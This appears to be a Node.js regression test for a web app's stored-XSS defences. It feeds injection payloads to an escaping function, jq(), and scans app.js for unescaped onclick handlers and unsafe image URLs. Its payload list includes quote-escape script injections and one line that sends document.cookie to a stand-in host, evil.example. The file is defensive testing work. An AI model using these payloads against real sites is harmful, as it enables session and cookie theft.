const fs = require("fs"), vm = require("vm");
const WWW = fs.existsSync("assets/www") ? "assets/www" : "www";
/* v37 回归: 存储型 XSS 防护。
 * 1) jq() 必须让属性/JS 字符串逃逸 payload 失效（不能从 '...' 里跑出来）；
 * 2) app.js 的内联 onclick 里不允许再出现未经 jq() 包裹的 CHAT.name / CHAT.runId；
 * 3) 生图 URL 必须走协议白名单 + escH。 */

const ctx = {console};
ctx.window = ctx; ctx.globalThis = ctx;
vm.createContext(ctx);
vm.runInContext(fs.readFileSync(WWW + "/rp/escutil.js", "utf8"), ctx, {filename: "escutil.js"});

let pass = 0, fail = 0;
const t = (n, c)=>{ c ? pass++ : (fail++, console.log("FAIL:", n)); };

/* jq() 的目标是双上下文（HTML 属性 + JS 字符串）安全：
 * 单引号转义成 \' 是对的（合法的 JS 转义），断言要看"能否逃逸"而不是"有没有单引号"。 */
function noBare(s, q){
  /* 抹掉所有被反斜杠转义的引号后，若还残留未转义引号 => 可逃逸 */
  return s.replace(new RegExp("\\\\" + q, "g"), "").indexOf(q) < 0;
}
const payloads = [
  "x');alert(document.cookie);//",
  'x" onmouseover="alert(1)',
  "x');fetch('https://evil.example/'+document.cookie);//",
  "</script><script>alert(1)</script>",
  "a`+alert(1)+`",
  "a\\'b",
  "\\');alert(1);//",
  "林黛玉');doEvil(`x`);//",
];
for(const p of payloads){
  const out = vm.runInContext("jq(" + JSON.stringify(p) + ")", ctx);
  /* 把 out 放回 onclick="f('...')" 的 JS 字符串里：不能断字符串、不能注入语句 */
  t("jq 单引号不可逃逸: " + p, noBare(out, "'"));
  t("jq 双引号不可逃逸: " + p, noBare(out, '"'));
  t("jq 无裸尖括号: " + p, out.indexOf("<") < 0 && out.indexOf(">") < 0);
  /* 真正跑一遍：把转义结果当字符串字面量求值，必须得到一个字符串（逃逸就会语法错误） */
  let rt = null, threw = false;
  try{ rt = vm.runInContext("('" + out + "')", ctx); }
  catch(e){ threw = true; }
  t("jq 结果可安全放入单引号字面量: " + p, !threw && typeof rt === "string");
}

const appSrc = fs.readFileSync(WWW + "/app.js", "utf8");
/* 逐个 onclick 属性扫描：出现 CHAT.name / CHAT.runId 且前面不是 jq( 说明又回到裸拼老路 */
const onclickAttrs = appSrc.match(/onclick="[^"]*"/g) || [];
const bad = onclickAttrs.filter(a=> /(?<!jq\()CHAT\.(?:name|runId)\b/.test(a));
t("app.js 存在内联 onclick 模板(扫描有效性)", onclickAttrs.length > 100);
t("app.js 无裸拼 CHAT.name/runId 的 onclick", bad.length === 0);
if(bad.length) console.log("  裸拼样例:", bad.slice(0, 3).join("\n  "));

t("抽屉菜单使用 jq() 包裹",
  appSrc.indexOf("charDetail('${jq(CHAT.runId)}','${jq(CHAT.name)}')") >= 0);
t("角色详情入口使用 jq() 包裹", /\$\{jq\([A-Za-z_.]*name\)\}/.test(appSrc));
t("生图 URL 有协议白名单",
  /const safeUrl = .*\/\^\(data:image\\\/\|https:\\\/\\\/\)\/i/.test(appSrc));
t("生图 URL 走 escH",
  /escH\(safeUrl\)/.test(appSrc) && /if\(!safeUrl\)/.test(appSrc));

console.log(`xss-payload: ${pass} pass, ${fail} fail`);
process.exit(fail ? 1 : 0);
